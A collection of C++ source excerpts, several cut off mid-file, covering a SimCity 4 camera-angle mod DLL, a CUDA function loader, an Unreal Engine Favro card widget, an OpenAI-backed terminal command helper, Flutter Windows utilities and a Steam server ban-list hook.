[
    "// Portions of this file have been adapted from the nam-dll project:\n/*\n * Copyright (c) 2023 NAM Team contributors\n *\n * nam-dll is free software: you can redistribute it and/or modify\n * it under the terms of the GNU Lesser General Public License as\n * published by the Free Software Foundation, either version 3 of\n * the License, or (at your option) any later version.\n *\n * nam-dll is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU Lesser General Public License for more details.\n *\n * You should have received a copy of the GNU Lesser General Public License\n * along with nam-dll.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"Logger.h\"\n#include \"SC4VersionDetection.h\"\n#include \"version.h\"\n#include \"cIGZCOM.h\"\n#include \"cRZCOMDllDirector.h\"\n#include \"cIGZMessage2.h\"\n#include \"cIGZMessage2Standard.h\"\n#include \"cRZMessage2COMDirector.h\"\n#include \"cIGZMessageServer2.h\"\n#include \"GZServPtrs.h\"\n#include \"cIGZCheatCodeManager.h\"\n#include \"cISC4App.h\"\n#include \"cISC43DRender.h\"\n#include \"cIGZWin.h\"\n#include \"cISC4View3DWin.h\"\n#include <Windows.h>\n#include \"wil/resource.h\"\n#include \"wil/win32_helpers.h\"\n#include <numbers>\n#include <vector>\n#include <string>\n#include \"StringViewUtil.h\"\n/* #include <iostream> */\n\n\n#ifdef __clang__\n#define NAKED_FUN __attribute__((naked))\n#else\n#define NAKED_FUN __declspec(naked)\n#endif\n\n\nstatic constexpr uint32_t kGZWin_WinSC4App = 0x6104489a;\nstatic constexpr uint32_t kGZWin_SC4View3DWin = 0x9a47b417;\nstatic constexpr uint32_t kGZIID_cISC4View3DWin = 0xFA47B3F9;\n\nstatic constexpr uint32_t kMessageCheatIssued = 0x230E27AC;\nstatic constexpr uint32_t kSC4MessagePostCityInit = 0x26D31EC1;\nstatic constexpr uint32_t kSC4MessagePreCityShutdown = 0x26D31EC2;\n\nstatic constexpr uint32_t kPitchAngleCheatID = 0x4A3A1EF5;\nstatic constexpr uint32_t kYawAngleCheatID = 0x6E88F96F;\nstatic constexpr uint32_t kCameraDllDirectorID = 0x23B41621;\n\nstatic constexpr std::string_view PluginLogFileName = \"memo.3dcamera.log\";\n\nstatic constexpr uint32_t yawAddress0 = 0x7ccb0a;\nstatic constexpr uint32_t yawAddress1 = 0xabcfc4;\nstatic constexpr uint32_t yawAddress2 = 0xabacb8;\nstatic constexpr uint32_t pitchAddress1 = 0xabcfd8;\nstatic constexpr uint32_t pitchAddress2 = 0xabaccc;\n\nstatic constexpr int numZooms = 5;\nstatic const float_t pitchRadDefault[numZooms] = {0.52359879f, 0.61086524f, 0.69813168f, 0.78539819f, 0.78539819f};\nstatic constexpr float_t yawRadDefault = -0.39269909;\nstatic constexpr float_t tol = 0.001;\n\nnamespace\n{\n\tfloat_t deg2rad(float_t deg)\n\t{\n\t\t// to avoid some graphical glitches at 0 and 90 degrees, we slightly offset the angle\n\t\tif (-tol < deg && deg < tol) {\n\t\t\tdeg = 0 + tol;\n\t\t} else if (90 - tol < deg && deg < 90 + tol) {\n\t\t\tdeg = 90 - tol;\n\t\t}\n\t\treturn deg * (std::numbers::pi / 180);\n\t}\n\n\tfloat_t clip(float_t x, float_t xMin, float_t xMax)\n\t{\n\t\treturn x < xMin ? xMin : (x > xMax ? xMax : x);\n\t}\n\n\tstd::filesystem::path GetDllFolderPath()\n\t{\n\t\twil::unique_cotaskmem_string modulePath = wil::GetModuleFileNameW(wil::GetModuleInstanceHandle());\n\n\t\tstd::filesystem::path temp(modulePath.get());\n\n\t\treturn temp.parent_path();\n\t}\n\n\tvoid OverwriteMemoryFloat(void* address, float_t newValue)\n\t{\n\t\tstatic_assert(sizeof(float_t) == 4);  // 32 bit == 4 byte\n\t\tDWORD oldProtect;\n\t\t// Allow the executable memory to be written to.\n\t\tTHROW_IF_WIN32_BOOL_FALSE(VirtualProtect(\n\t\t\taddress,\n\t\t\tsizeof(newValue),\n\t\t\tPAGE_EXECUTE_READWRITE,\n\t\t\t&oldProtect));\n\n\t\t// Patch the memory at the specified address.\n\t\t*((float_t*)address) = newValue;\n\t}\n\n\ttypedef bool(__thiscall* pfn_cSC4CameraControl_UpdateCameraPosition)(cSC4CameraControl* pThis, uint32_t updateMode);\n\n\tstatic pfn_cSC4CameraControl_UpdateCameraPosition UpdateCameraPosition = reinterpret_cast<pfn_cSC4CameraControl_UpdateCameraPosition>(0x7ccf80);\n}\n\nclass cSC4CameraControl\n{\n\tpublic:\n\t\tvoid* vtable;\n\t\tintptr_t unknown[0x45];\n\t\tfloat_t yaw;\n\t\tfloat_t pitch;\n};\nstatic_assert(offsetof(cSC4CameraControl, yaw) == 0x118);\n\nclass CameraDllDirector final : public cRZMessage2COMDirector\n{\npublic:\n\n\tCameraDllDirector()\n\t{\n\t\tstd::filesystem::path dllFolderPath = GetDllFolderPath();\n\n\t\tstd::filesystem::path logFilePath = dllFolderPath;\n\t\tlogFilePath /= PluginLogFileName;\n\n\t\tLogger& logger = Logger::GetInstance();\n\t\tlogger.Init(logFilePath, LogLevel::Error);\n\t\tlogger.WriteLogFileHeader(\"3D Camera DLL \" PLUGIN_VERSION_STR);\n\t}\n\n\tuint32_t GetDirectorID() const\n\t{\n\t\treturn kCameraDllDirectorID;\n\t}\n\n\tvoid PostCityInit()\n\t{\n\t\tLogger& logger = Logger::GetInstance();\n\t\tcISC4AppPtr pSC4App;\n\t\tif (pSC4App)\n\t\t{\n\t\t\tcIGZCheatCodeManager* pCheatMgr = pSC4App->GetCheatCodeManager();\n\t\t\tif (pCheatMgr)\n\t\t\t{\n\t\t\t\tpCheatMgr->AddNotification2(this, 0);\n\t\t\t\tpCheatMgr->RegisterCheatCode(kPitchAngleCheatID, cRZBaseString(\"CameraPitch\"));\n\t\t\t\tpCheatMgr->RegisterCheatCode(kYawAngleCheatID, cRZBaseString(\"CameraYaw\"));\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tlogge",
    "// MIT License\n// \n// Copyright (C) 2018-2024, Tellusim Technologies Inc. https://tellusim.com/\n// \n// Permission is hereby granted, free of charge, to any person obtaining a copy\n// of this software and associated documentation files (the \"Software\"), to deal\n// in the Software without restriction, including without limitation the rights\n// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n// copies of the Software, and to permit persons to whom the Software is\n// furnished to do so, subject to the following conditions:\n// \n// The above copyright notice and this permission notice shall be included in all\n// copies or substantial portions of the Software.\n// \n// THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n// SOFTWARE.\n\n#include <core/TellusimLog.h>\n#include <platform/TellusimContext.h>\n\n#include \"../include/TellusimCU.h\"\n\n/*\n */\nnamespace Tellusim {\n\t\n\t/*\n\t */\n\tnamespace CU {\n\t\t\n\t\t/*\n\t\t */\n\t\tbool init() {\n\t\t\t\n\t\t\t// function address\n\t\t\t#define GET_ADDRESS(TYPE, NAME) { \\\n\t\t\t\tNAME = (TYPE)CUContext::getProcAddress(#NAME); \\\n\t\t\t\tif(NAME == nullptr && is_core) { \\\n\t\t\t\t\tTS_LOGF(Error, \"CU::init(): can't get %s function\\n\", #NAME); \\\n\t\t\t\t\treturn false; \\\n\t\t\t\t} \\\n\t\t\t}\n\t\t\t\n\t\t\t// core functions\n\t\t\tbool is_core = true;\n\t\t\t\n\t\t\t// Cuda functions\n\t\t\tGET_ADDRESS(PFN_cuGetErrorString, cuGetErrorString)\n\t\t\tGET_ADDRESS(PFN_cuGetErrorName, cuGetErrorName)\n\t\t\tGET_ADDRESS(PFN_cuInit, cuInit)\n\t\t\tGET_ADDRESS(PFN_cuDriverGetVersion, cuDriverGetVersion)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGet, cuDeviceGet)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetCount, cuDeviceGetCount)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetName, cuDeviceGetName)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetUuid, cuDeviceGetUuid)\n\t\t\tGET_ADDRESS(PFN_cuDeviceTotalMem, cuDeviceTotalMem)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetAttribute, cuDeviceGetAttribute)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxRetain, cuDevicePrimaryCtxRetain)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxRelease, cuDevicePrimaryCtxRelease)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxSetFlags, cuDevicePrimaryCtxSetFlags)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxGetState, cuDevicePrimaryCtxGetState)\n\t\t\tGET_ADDRESS(PFN_cuDevicePrimaryCtxReset, cuDevicePrimaryCtxReset)\n\t\t\tGET_ADDRESS(PFN_cuCtxCreate, cuCtxCreate)\n\t\t\tGET_ADDRESS(PFN_cuCtxDestroy, cuCtxDestroy)\n\t\t\tGET_ADDRESS(PFN_cuCtxPushCurrent, cuCtxPushCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxPopCurrent, cuCtxPopCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetCurrent, cuCtxSetCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetCurrent, cuCtxGetCurrent)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetDevice, cuCtxGetDevice)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetFlags, cuCtxGetFlags)\n\t\t\tGET_ADDRESS(PFN_cuCtxSynchronize, cuCtxSynchronize)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetLimit, cuCtxSetLimit)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetLimit, cuCtxGetLimit)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetCacheConfig, cuCtxGetCacheConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetCacheConfig, cuCtxSetCacheConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetSharedMemConfig, cuCtxGetSharedMemConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxSetSharedMemConfig, cuCtxSetSharedMemConfig)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetApiVersion, cuCtxGetApiVersion)\n\t\t\tGET_ADDRESS(PFN_cuCtxGetStreamPriorityRange, cuCtxGetStreamPriorityRange)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoad, cuModuleLoad)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadData, cuModuleLoadData)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadDataEx, cuModuleLoadDataEx)\n\t\t\tGET_ADDRESS(PFN_cuModuleLoadFatBinary, cuModuleLoadFatBinary)\n\t\t\tGET_ADDRESS(PFN_cuModuleUnload, cuModuleUnload)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetFunction, cuModuleGetFunction)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetGlobal, cuModuleGetGlobal)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetTexRef, cuModuleGetTexRef)\n\t\t\tGET_ADDRESS(PFN_cuModuleGetSurfRef, cuModuleGetSurfRef)\n\t\t\tGET_ADDRESS(PFN_cuLinkCreate, cuLinkCreate)\n\t\t\tGET_ADDRESS(PFN_cuLinkAddData, cuLinkAddData)\n\t\t\tGET_ADDRESS(PFN_cuLinkAddFile, cuLinkAddFile)\n\t\t\tGET_ADDRESS(PFN_cuLinkComplete, cuLinkComplete)\n\t\t\tGET_ADDRESS(PFN_cuLinkDestroy, cuLinkDestroy)\n\t\t\tGET_ADDRESS(PFN_cuMemGetInfo, cuMemGetInfo)\n\t\t\tGET_ADDRESS(PFN_cuMemAlloc, cuMemAlloc)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocPitch, cuMemAllocPitch)\n\t\t\tGET_ADDRESS(PFN_cuMemFree, cuMemFree)\n\t\t\tGET_ADDRESS(PFN_cuMemGetAddressRange, cuMemGetAddressRange)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocHost, cuMemAllocHost)\n\t\t\tGET_ADDRESS(PFN_cuMemFreeHost, cuMemFreeHost)\n\t\t\tGET_ADDRESS(PFN_cuMemHostAlloc, cuMemHostAlloc)\n\t\t\tGET_ADDRESS(PFN_cuMemHostGetDevicePointer, cuMemHostGetDevicePointer)\n\t\t\tGET_ADDRESS(PFN_cuMemHostGetFlags, cuMemHostGetFlags)\n\t\t\tGET_ADDRESS(PFN_cuMemAllocManaged, cuMemAllocManaged)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetByPCIBusId, cuDeviceGetByPCIBusId)\n\t\t\tGET_ADDRESS(PFN_cuDeviceGetPCIBusId, cuDeviceGetP",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"Slate/Widgets/FavroCardsTreeView.h\"\n\n#include \"F2UEStyle.h\"\n#include \"FavroTypes.h\"\n#include \"SlateOptMacros.h\"\n#include \"Widgets/Layout/SWrapBox.h\"\n#include \"Widgets/Text/SMultiLineEditableText.h\"\n\nBEGIN_SLATE_FUNCTION_BUILD_OPTIMIZATION\n\nvoid SFavroCardsTreeView::Construct(const FArguments& InArgs, const TSharedPtr<FFavroLinkModel>& ModelIn)\n{\n\tModel = ModelIn;\n\n\tSTreeView::Construct(InArgs);\n}\n\nvoid SFavroCardsViewRow::Construct(const FArguments& InArgs, const TSharedRef<STableViewBase>& InOwnerTableView)\n{\n\tItem = InArgs._Item;\n\n\tSTableRow<FFavroCardPtr>::Construct(STableRow<FFavroCardPtr>::FArguments(), InOwnerTableView);\n\n\tChildSlot\n\t[\n\t\tSNew(SBox)\n\t\t.Padding(4.f)\n\t\t[\n\t\t\tGenerateWidget()\n\t\t]\n\t];\n}\n\nTSharedRef<SWidget> SFavroCardsViewRow::GenerateWidget()\n{\n\tif (!Item.IsValid())\n\t{\n\t\treturn SNullWidget::NullWidget;\n\t}\n\n\treturn\n\t\tSNew(SOverlay)\n\t\t+ SOverlay::Slot()\n\t\t[\n\t\t\tSNew(SBorder)\n\t\t\t.BorderImage(FF2UEStyle::Get().GetBrush(\"Favro.CardBackground\"))\n\t\t\t.Padding(16.f, 8.f)\n\t\t\t[\n\t\t\t\tSNew(SVerticalBox)\n\t\t\t\t+ SVerticalBox::Slot()\n\t\t\t\t  .VAlign(VAlign_Fill)\n\t\t\t\t  .HAlign(HAlign_Fill)\n\t\t\t\t  .FillHeight(1.f)\n\t\t\t\t[\n\t\t\t\t\tConstructTitleRow()\n\t\t\t\t]\n\n\t\t\t\t+ SVerticalBox::Slot()\n\t\t\t\t  .VAlign(VAlign_Bottom)\n\t\t\t\t  .HAlign(HAlign_Fill)\n\t\t\t\t  .AutoHeight()\n\t\t\t\t  .Padding(0.f, Item->Tags.IsEmpty() ? 0.f : 4.f, 0.f, 0.f)\n\t\t\t\t[\n\t\t\t\t\tConstructTagsRow()\n\t\t\t\t]\n\n\t\t\t\t+ SVerticalBox::Slot()\n\t\t\t\t  .VAlign(VAlign_Bottom)\n\t\t\t\t  .HAlign(HAlign_Fill)\n\t\t\t\t  .AutoHeight()\n\t\t\t\t  .Padding(0.f, Item->Description.IsEmpty() ? 0.f : 4.f, 0.f, 0.f)\n\t\t\t\t[\n\t\t\t\t\tConstructDescriptionRow()\n\t\t\t\t]\n\t\t\t]\n\t\t]\n\t\t+ SOverlay::Slot()\n\t\t[\n\t\t\tSAssignNew(Background, SBorder)\n\t\t\t.BorderImage(this, &SFavroCardsViewRow::GetBorderBrush)\n\t\t];\n}\n\nTSharedRef<SWidget> SFavroCardsViewRow::ConstructTitleRow()\n{\n\treturn SNew(STextBlock).Text(FText::FromString(Item->Name));\n}\n\nTSharedRef<SWidget> SFavroCardsViewRow::ConstructTagsRow()\n{\n\tif (Item->Tags.IsEmpty())\n\t{\n\t\treturn SNullWidget::NullWidget;\n\t}\n\n\tconst TSharedRef<SWrapBox> WrapBox =\n\t\tSNew(SWrapBox)\n\t\t.Orientation(Orient_Horizontal)\n\t\t.UseAllottedSize(true)\n\t\t.InnerSlotPadding(FVector2d(8.f, 4.f));\n\tconst FSlateBrush* BorderBrush = new FSlateRoundedBoxBrush(FFavroColors::Blue, 4.f, FStyleColors::Secondary, 1.f);\n\n\tint Index = 0;\n\n\tfor (FString TagId : Item->Tags)\n\t{\n\t\tIndex++;\n\t\tFString DummyString = FString::Printf(TEXT(\"Tag %i\"), Index);\n\n\t\tWrapBox->AddSlot()\n\t\t[\n\t\t\tSNew(SBorder)\n\t\t\t.BorderImage(BorderBrush)\n\t\t\t.BorderBackgroundColor(FLinearColor(.5f, .5f, .5f, 1.0f))\n\t\t\t.Padding(8.f, 2.f)\n\t\t\t[\n\t\t\t\tSNew(STextBlock)\n\t\t\t\t.TextStyle(FAppStyle::Get(), \"SmallText\")\n\t\t\t\t.Text(FText::FromString(*DummyString))\n\t\t\t]\n\t\t];\n\t}\n\n#if 0\n\t// @TODO(Marian) SLATE - This is how we'll do once we have proper Tags type\n\tfor (auto& [TagLabel, Color] : Item->Tags)\n\t{\n\t\tconst FSlateColor TagColor = FF2UEStyle::ConvertToSlateColor(Color);\n\t\tWrapBox->AddSlot()\n\t\t[\n\t\t\tSNew(SFavroTagChip)\n\t\t\t.Label(TagLabel)\n\t\t\t.Color(TagColor)\n\t\t];\n\t}\n\n#endif\n\n\treturn WrapBox;\n}\n\nTSharedRef<SWidget> SFavroCardsViewRow::ConstructDescriptionRow()\n{\n\tif (Item->Description.IsEmpty())\n\t{\n\t\treturn SNullWidget::NullWidget;\n\t}\n\n\tTSharedRef<SHorizontalBox> HorizontalBox = SNew(SHorizontalBox);\n\n\tconst FString PreviewString = Item->Description.Replace(TEXT(\"\\n\"), TEXT(\" \"));\n\n\tHorizontalBox->AddSlot()\n\t             .Padding(0.f, 0.f, 4.f, 0.f)\n\t             .VAlign(VAlign_Center)\n\t             .HAlign(HAlign_Left)\n\t             .AutoWidth()\n\t[\n\t\tSNew(SImage)\n\t\t\t\t.Image(FF2UEStyle::GetBrush(\"Favro.CardDescription\"))\n\t\t\t\t.ColorAndOpacity(FSlateColor::UseForeground())\n\t];\n\n\tHorizontalBox->AddSlot()\n\t             .VAlign(VAlign_Center)\n\t             .HAlign(HAlign_Fill)\n\t             .FillWidth(1.f)\n\t[\n\t\tSNew(STextBlock)\n\t\t.Text(FText::FromString(PreviewString))\n\t\t.ColorAndOpacity(FSlateColor::UseSubduedForeground())\n\t\t.OverflowPolicy(ETextOverflowPolicy::Ellipsis)\n\t];\n\n\treturn HorizontalBox;\n}\n\nconst FSlateBrush* SFavroCardsViewRow::GetBorderBrush() const\n{\n\tconst FButtonStyle& ButtonStyle = FAppStyle::GetWidgetStyle<FButtonStyle>(\"PlacementBrowser.Asset\");\n\n\tif (!Background.IsValid())\n\t{\n\t\treturn &ButtonStyle.Normal;\n\t}\n\n\treturn Background->IsHovered() ? &ButtonStyle.Hovered : &ButtonStyle.Normal;\n}\n\nvoid SFavroTagChip::Construct(const FArguments& InArgs)\n{\n\tLabel = InArgs._Label;\n\tColor = InArgs._Color;\n\n\tconst FSlateBrush* BorderBrush = new FSlateRoundedBoxBrush(Color, 4.f, FFavroColors::Secondary, 1.f);\n\n\tChildSlot\n\t[\n\t\tSNew(SBorder)\n\t\t.BorderImage(BorderBrush)\n\t\t.BorderBackgroundColor(FLinearColor(.5f, .5f, .5f, 1.0f))\n\t\t.Padding(8.f, 2.f)\n\t\t[\n\t\t\tSNew(STextBlock)\n\t\t\t.TextStyle(FAppStyle::Get(), \"SmallText\")\n\t\t\t.Text(FText::FromString(*Label))\n\t\t]\n\t];\n}\n\n\nEND_SLATE_FUNCTION_BUILD_OPTIMIZATION\n",
    "#include \"GPTCommunicator.h\"\n#include \"../Utils/FileHandler.h\"\n#include <iostream>\n#include <nlohmann/json.hpp>\n#include <cpr/cpr.h>\n\n#include <vector>\n\n\nstd::string read_api_key()\n{\n#ifdef _WIN32\n\tstd::ifstream file(\"C:/projekte/terminalhelper/apikey.txt\"); // Open the text file\n#else\n\tstd::ifstream file(\"/home/adminlokal/projekte/terminalhelper/apikey.txt\"); // Open the text file\n#endif\n\n\tif (!file)\n\t{ // If the file opening failed\n\t\tstd::cerr << \"Failed to open the API key file!\" << std::endl;\n\t}\n\n\tstd::string api_key;\n\tstd::getline(file, api_key); // Read the API key (assuming it's on the first line)\n\n\tfile.close(); // Close the file\n\n\treturn api_key;\n}\n\n\nstd::string chat_with_gpt(const std::string& message_content, const std::string& system_message = \"\")\n{\n\tconst std::string API_ENDPOINT = \"https://api.openai.com/v1/chat/completions\";\n\tconst std::string API_KEY = read_api_key(); // Replace this with your actual API Key\n\n\tnlohmann::json payload;\n\n\tif (system_message != \"\")\n\t{\n\t\t// Construct the request payload\n\t\tpayload = {\n\t\t\t{\"model\", \"gpt-3.5-turbo\"},\n#ifdef _WIN32\n\n\t\t\t//{\"messages\", {{{\"role\", \"user\"}, {\"content\", message_content}}}},\n\t\t\t{\"messages\",\n\t\t\t\tnlohmann::json::array({\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"system\"}, {\"content\",  system_message + \" \\n This is cmd output, TerminalHelper.exe is a programm to use the openai api, so you don't have to care about that.\"}}),\n\t\t\t\t\t//mkdirnlohmann::json::object({{\"role\", \"user\"}, {\"content\", system_message + \" \\n This is cmd output, TerminalHelper.exe is a programm to use the openai api, so you don't have to care about that.\"}}),\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"user\"}, {\"content\", message_content}})\n\t\t\t\t\t})\n\t\t\t},\n#else\n\t\t\t//{\"messages\", {{{\"role\": \"system\", \"content\" : \"You are an expert for terminal commands on linux.\"}, {\"role\", \"user\"}, {\"content\", \"linux terminal command for: \" + message_content}}}},\n\t\t\t{\"messages\",\n\t\t\t\tnlohmann::json::array({\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"system\"}, {\"content\", \"You are an expert for terminal commands on linux.\"}}),\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"user\"}, {\"content\", \"linux terminal command for: \" + message_content}})\n\t\t\t\t\t})\n\t\t\t},\n#endif\n\t\t\t{\"temperature\", 0.3} };\n\t}\n\telse\n\t{\n\t\t// Construct the request payload\n\t\tpayload = {\n\t\t\t{\"model\", \"gpt-3.5-turbo\"},\n#ifdef _WIN32\n\n\t\t\t//{\"messages\", {{{\"role\", \"user\"}, {\"content\", message_content}}}},\n\t\t\t{\"messages\",\n\t\t\t\tnlohmann::json::array({\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"system\"}, {\"content\", \"You are an expert for the cmd on windows.\"}}),\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"user\"}, {\"content\", \"windows cmd command for: \" + message_content}})\n\t\t\t\t\t})\n\t\t\t},\n#else\n\t\t\t//{\"messages\", {{{\"role\": \"system\", \"content\" : \"You are an expert for terminal commands on linux.\"}, {\"role\", \"user\"}, {\"content\", \"linux terminal command for: \" + message_content}}}},\n\t\t\t{\"messages\",\n\t\t\t\tnlohmann::json::array({\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"system\"}, {\"content\", \"You are an expert for terminal commands on linux.\"}}),\n\t\t\t\t\tnlohmann::json::object({{\"role\", \"user\"}, {\"content\", \"linux terminal command for: \" + message_content}})\n\t\t\t\t\t})\n\t\t\t},\n#endif\n\t\t\t{\"temperature\", 0.3} };\n\t}\n\tsaveRawMessage(payload);\n\n\t// Send the POST request\n\tcpr::Response r = cpr::Post(\n\t\tcpr::Url{ API_ENDPOINT },\n\t\tcpr::Header{\n\t\t\t{\"Content-Type\", \"application/json\"},\n\t\t\t{\"Authorization\", \"Bearer \" + API_KEY} },\n\t\t\tcpr::Body{ payload.dump() });\n\n\tsaveRawResponse(r);\n\t// std::cerr << payload << std::endl;\n\t// Parse the response\n\t// std::cerr << \"Raw API response: \" << r.text << std::endl;\n\t// std::cout << \" \\n \\n  end of raw API response \\n \\n\" << std::endl;\n\tauto response_data = nlohmann::json::parse(r.text);\n\treturn response_data[\"choices\"][0][\"message\"][\"content\"].get<std::string>();\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#include <filesystem>\n#include <fstream>\n#include <vector>\n#include <map>\n\n#define CON_LOG_PREFIX \"[SteamBans] \"\n#include \"Console.h\"\n\n//Ignore error 4996\n#pragma comment(lib, \"steam_api64.lib\")\n#pragma warning(disable: 4996)\n#include <steam/steam_api.h>\n\nstruct g_ctx\n{\n    std::atomic_bool running;\n    HANDLE hUnloadEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Signal to unload\n    HANDLE hUnloadEventAck = CreateEvent(NULL, TRUE, FALSE, NULL);\n    HMODULE hModule;\n    void* vftable_SteamNetConnectionStatusChanged;\n    std::vector<unsigned long long> banned_steamids = {};\n} Context;\n\nFARPROC GetProcAddressEx(const HMODULE hModule, const std::string lpProcName)\n{\n    const FARPROC pfnProc = GetProcAddress(hModule, lpProcName.c_str());\n    const auto lpProcNameW = std::wstring(lpProcName.begin(), lpProcName.end());\n    if (!pfnProc)\n    {\n        const auto msg = std::format(TEXT(\"Could not find export {}!\"), lpProcNameW);\n        MessageBox(NULL, msg.c_str(), TEXT(\"Error\"), MB_OK | MB_ICONERROR);\n        FreeLibraryAndExitThread(Context.hModule, NULL);\n        return nullptr;\n    }\n\n    return pfnProc;\n}\nvoid onSteamNetConnectionStatusChanged(std::uintptr_t self, SteamNetConnectionStatusChangedCallback_t* pParam);\ndecltype(&onSteamNetConnectionStatusChanged) oSteamNetConnectionStatusChanged;\n\nbool IsBannedSteamID(const std::uint64_t steamid)\n{\n    return std::find(Context.banned_steamids.begin(), Context.banned_steamids.end(), steamid) != Context.banned_steamids.end();\n}\n\nvoid onSteamNetConnectionStatusChanged(std::uintptr_t self, SteamNetConnectionStatusChangedCallback_t* pParam)\n{\n    const std::uint64_t connectionSteamID = pParam->m_info.m_identityRemote.GetSteamID64();\n    if (IsBannedSteamID(connectionSteamID))\n    {\n        if (pParam->m_info.m_eState == k_ESteamNetworkingConnectionState_Connecting)\n        {\n            DebugOutL(std::format(TEXT(\"Banned SteamID tried to join: {}\"), connectionSteamID));\n            SteamNetworkingSockets()->CloseConnection(pParam->m_hConn, 0, \"You are banned!\", false);\n        }\n        return;\n    }\n\n    return oSteamNetConnectionStatusChanged(self, pParam);\n}\n\nvoid UpdateBanList()\n{\n    // Make or open steamid ban list in the same directory as the process\n    std::filesystem::path path = std::filesystem::current_path() / \"steam_bans.txt\";\n\n    // Create the file if it doesn't exist\n    if (!std::filesystem::exists(path))\n    {\n        std::ofstream file(path);\n        file << \"# Put your banned steamids here\\n\";\n        file << \"# Each steamid should be on a new line\\n\";\n        file << \"# For example:\\n\";\n        file << \"76561199531536640 # TheGuy920's crash bot\\n\";\n        file << \"76561199665208613 # TheGuy920's crash bot #2\\n\";\n        file.close();\n    }\n\n    Context.banned_steamids.clear();\n    DebugOutL(\"Fetching banned users from steam_bans.txt...\");\n\n    // Each steamid should be on a new line\n    std::ifstream file(path);\n    std::string line;\n    while (std::getline(file, line))\n    {\n        if (line.size() < 17)\n            continue;\n\n        // Ensure 17 numerical digits\n        if (!std::all_of(line.begin(), line.begin() + 17, ::isdigit))\n            continue;\n\n        // Convert the string to a steamid\n        const std::uint64_t steamid64 = std::stoull(line);\n\n        DebugOutL(\"Added SteamID to banned 